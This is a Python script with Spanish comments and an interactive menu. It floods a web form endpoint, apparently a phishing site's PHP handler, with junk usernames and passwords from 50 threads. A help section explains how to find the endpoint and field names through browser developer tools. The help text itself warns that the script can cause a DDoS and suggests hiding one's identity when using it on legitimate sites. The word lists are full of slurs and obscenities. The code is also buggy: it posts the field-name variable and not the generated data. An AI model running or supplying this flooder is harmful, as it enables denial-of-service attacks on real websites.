# Modulos, ojo
import threading, requests, random, time
from asyncore import loop

# Datos pa los correos y contraseñas, puedes meter mas si quieres, ya esto es abrasada buena jajaja.
MAIL_Var = ["sharon","richard","justin","ella","jungcock","hashimin","bulsheesh","scandalors","melody","acker","jhony","lexie","khalifa","stephen","dorota","georgeta","krystiana","gerbold","iona","david","sex","shit","semen","noob","hacker","fukyou"]
MAIL1_Var = ["comunagay","help","gaming","assistant","trinity","sponsor","love_you","sexlife","lefote","mukbangs","tusmuertos","porelculo","info","work","school","ayudameel","care","random","bestiality","pedophile","feminismomata","vivamipolla","putonoob","noereshacker","eresretrasao"]
MAIL2_Var = ["gmail","outlook","me","yahoo","pornhub","microsoft","youtube","espermadeperro","brazzers","google","hotmail","instaculo","facebook"]
MAIL3_Var = ["mecagoendios","mefolloatumama","vivamipinga","alloraracasacrack"]
PASSWORD_Var = ["123456789","987654321","090807060504030201","Dragon","1111111111","Sheesh123","spam6912345","ILOVEYOU","WELOVEEARTH","08112233445","GetReadyWeAreHavingFun","ILOVEPORN691298","636564636261Memak","loveLetter","Qwerty123","qwertyuopasdfghjklzxcvbnm","GYGAUBCDUSVBXJAISHI","Hentailover69","hewdvxbsxhjksbdsbohedf","wteruyegabzkxchh","qwertyuiopasdfghjklzxcvbnm","cumdrencher","corruptedanus","anallover","youareafuckingnoob","mycockbig9inch","phishingsitehahha","53267458h","elpapaespedofilo","hailputin"]

#Logo
LOGO = """'########:'########'########:::'###::::::'######:'##::::'##'##:::::::'#######::'######::
 ##.... ##:##.....:... ##..:::'## ##::::'##... ##:##:::: ##:##::::::'##.... ##'##... ##:
 ##:::: ##:##::::::::: ##::::'##:. ##::::##:::..::##:::: ##:##:::::::##:::: ##:##:::..::
 ########::######::::: ##:::'##:::. ##:::##:::::::##:::: ##:##:::::::##:::: ##. ######::
 ##.....:::##...:::::: ##::::#########:::##:::::::##:::: ##:##:::::::##:::: ##:..... ##:
 ##::::::::##::::::::: ##::::##.... ##:::##::: ##:##:::: ##:##:::::::##:::: ##'##::: ##:
 ##::::::::########::: ##::::##:::: ##::. ######:. #######::########. #######:. ######::
..::::::::........::::..::::..:::::..::::......:::.......::........::.......:::......:::
::::::::'####'##::: ##'##:::'##'########:'######:'########:'#######:'########:::::::::: 
::::::::. ##::###:: ##. ##:'##::##.....:'##... ##... ##..:'##.... ##:##.... ##::::::::: 
::::::::: ##::####: ##:. ####:::##:::::::##:::..:::: ##::::##:::: ##:##:::: ##::::::::: 
'#######: ##::## ## ##::. ##::::######:::##::::::::: ##::::##:::: ##:########:'#######: 
........: ##::##. ####::: ##::::##...::::##::::::::: ##::::##:::: ##:##.. ##::........: 
::::::::: ##::##:. ###::: ##::::##:::::::##::: ##::: ##::::##:::: ##:##::. ##:::::::::: 
::::::::'####:##::. ##::: ##::::########. ######:::: ##:::. #######::##:::. ##::::::::: 
::::::::....:..::::..::::..::::........::......:::::..:::::.......::..:::::..:::::::::: """
LOGO1 = """\033[1;36;40mMAMAME: \033[1;35;40mEL GUEVO MANO
\033[1;36;40mLOS MAS DURO CONIO: \033[1;35;40mKLK MANITO VAMO A DALE PLOMO A ESA GENTE DIABLO"""

# Delay
T = 0.75
T1 = 0.50

# VAINA HEAVY
print(LOGO)
print(LOGO1)
time.sleep(T)
print("(DIABLO CONIO)\n")
time.sleep(T)
print("""\033[1;34;40m[?] \033[1;37;40mKlk manito que liamos hoy:
\033[1;32;40m[01] \033[1;37;40mINYECTOR DE MIERDA ;)
\033[1;32;40m[02] \033[1;37;40mAyudita PORFAVOL, soy nuev@
\033[1;32;40m[00] \033[1;37;40mPa fuera, que me voy\n""")
time.sleep(T1)
S = input("\033[1;33;40m[=] \033[1;37;40mTU ELECCION ha sido= ")

# El menu bonico
if S == "1" or S == "01":
    URL = input("\033[1;34;40m[?] \033[1;37;40mEl link *.php? (recuerda que debe ser el php donde se mandan los datos en la web esa): \n")
    DATA = input("\033[1;34;40m[?] \033[1;37;40mEn donde quieres inyectar la username?: \n")
    DATA1 = input("\033[1;34;40m[?] \033[1;37;40mEn donde quieres inyectar las password bro?: \n")
    print("\033[1;34;40m[*] \033[1;37;40mProcesando la wea ...")
    print("\033[1;34;40m[*] \033[1;37;40mPerate un momento que lo preparo todo usted si jode conio...")

    # El procesador, la veldadera vaina que mueve la vaina
    def SP():
        while True:
            MG = random.choice(MAIL_Var)
            M1G = random.choice(MAIL1_Var)
            M2G = random.choice(MAIL2_Var)
            M3G = random.choice(MAIL3_Var)
            PG = random.choice(PASSWORD_Var) + random.choice(PASSWORD_Var)
            PG1 = random.choice(PASSWORD_Var)
            PG2 = random.choice(PASSWORD_Var) + random.choice(MAIL_Var) or random.choice(MAIL_Var) + random.choice(PASSWORD_Var)  
            PG3 = PG or PG1 or PG2
            DATA3 = {
                f'{DATA}': f'{MG + M3G + M1G + "@" + M2G + ".com"}',
                f'{DATA1}': f'{PG2}'
            }
            time.sleep(5)
            Lmao = requests.post(url=URL, data=DATA).text  # No uses la variable Lmao jajam no te lo recomiendo.
            print(f'\033[1;34;40m[/] \033[1;37;40mEnviao satisfyer-mente a {URL}')
            print(f'\033[1;34;40m[*] \033[1;37;40mMierda inyectada be like= {MG + M3G + M1G + "@" + M2G + ".com"}:{PG3}\n')
    
    # JAJA ajusta los range para el numero de hilo (todos deben tener el mismo valor), si tienes una maquina de google ponlo en 500 y observa la devastacion jsjsj
    threads = []
    for i in range(50):
        t = threading.Thread(target=SP)
        t.daemon = True
        threads.append(t)
    for i in range(50):
        threads[i].start()
    for i in range(50):
        threads[i].join()
    loop()
    loop()
    loop()

    print("\033[1;31;40m[X] \033[1;37;40mLas liao, o la web o tu estais offline, o tas equivocao de cajitas de inyeccion bro.")
    print("\033[1;34;40m[-_-] \033[1;37;40mPASTA LA VISTA BABY")
    print("\033[1;34;40m[*] \033[1;33;40mNOS FUIMO ENTONSE, bendision")
    exit()

elif S == "2" or S == "02":
    print("""\033[1;35;40m
========================================================================
SI TU NO SABEL INGLES MAMATE UN GUEVO, 
voy a intentar expresarme en cristiano xd, VAMO ALLA:
========================================================================
    (OBVIO todo lo tienes que meter sin las comillas jaja)
    
Entras en el pc y entras en la web esa que quieres chingar desde chrome,
entones le das a los 3 puntitos>mas herramientas>herramientas de desarrollador.

Buscas la opcion Mantener registro o Keep registry/log o como se diga xd, 
sirve para que todo lo que ocurra quede relfejado y no se borre.

Y te vas a la pestaña Red/Network, es esencial.

En la web de los ''hackers'' metes mierda en los formularios que te pida
(si necesitas DNI falso o tarjetas de credito falsas, numeros de IBAN o 
tal puedes sacar TODO en: https://generadordni.es/ ).

Una vez que lo mandas verás en la consola donde pone nombre; un iconito 
de un papel, o varios xd, pues le clicas y le das  a vista previa y 
te aparecerá una wea en plan:

            usuario: culodemono
            password: lo que conio hayas metido xd
            
            o mas cosas xd, ten sentido comun tbn.
            
Vale, eso es lo que se manda al server del nota, quédate con lo que lleva los dos puntos,
la mierda que hayas metido solo ha servido para saber como se llaman los campos del formulario.

Y de vista previa vas a encabezados, veras una URL, PUES ESA ES LA URL 
DONDE SE MANDAN LOS DATOS ANTERIORES, puede que sea .php o no, pero es esa xd, guardala,
es donde haremos la inyeccion jeje.        
========================================================================
EXPLICASION :)
========================================================================

    - URL donde lo que has metido tiene que ir 
    
        Ejemplo: Usa 'https://redeemcode-phillipines.games/reward.php' 
        O USA 'https://redeemcode-phillipines.games/reward' 
        En base a lo que obtengas de la consola de desarrollo
        
        En lugar de: 'https://redeemcode-phillipines.games.com' , debe ser PHP.
        
        Lo puedes sacar viendo en herramientas de desarrollador de chrome o tal
        a donde va lo que envias en, se supone que esto ya lo sabes, no seas retrasao.
        
        Lo siguiente lo tienes que inspeccionar en el html, osea donde 
        esta el formulario o cajita de texto.
        
    - Inyectar Username 
        Ejemplo: 'username' lo que ponga en el input type del inspector de 
        pagina o lo que ponga en el vista previa de lo que dije antes.
    - Inyectar Passsword 
        Ejemplo: 'password' obvio no? 
------------------------------------------------------------------------
Pos eso, si todo ta correcto no deberias tener problemas, si no, 
debes jugar con los nombres de los campos de inyeccion, es usar mejor el inspector y ya.
------------------------------------------------------------------------

 +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +

========================================================================
Antes de que hagas correr el script:
========================================================================
    - Esto puede causar un ataque DDOS en el sitio.
        NO UTILIZAR EN SITIOS LEGALES si no quieres tener problemas, 
        salvo que sepas como ocultarte jeje.
    - Puede causar lag o Out Of Memory.
        Con 2GB de RAM vas que chutas, no los va a consumir, pero no da lag. 
    - Puede resultar dificil si no tienes ni puta idea de que debes hacer.
    - Puede que necesites estos modulos para que esto funcione fino bro
        (Like: Asyncio, Threading, Requests, Random And Time)
------------------------------------------------------------------------

 +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
PIM PAM ENTONCES TODO READY NO?
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

 +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +  +

========================================================================

========================================================================

------------------------------------------------------------------------
\n""")
    print("\033[1;34;40m[*] \033[1;33;40mSaliendo de la vaina")
    exit()

elif S == "0" or S == "00":
    print("\033[1;36;40m[-] \033[1;34;40mGlasia por usar mi codigo wey o weya")
    print("\033[1;34;40m[*] \033[1;33;40mTamo saliendo mi locoooo")
    exit()

else:
    print(f'\033[1;31;40m[X] \033[1;33;40m{S} \033[1;37;40mEso no taba en la lista mi loco.')
    print("\033[1;34;40m[*] \033[1;33;40mSaliendo conio, huyendo jaja")
    exit()

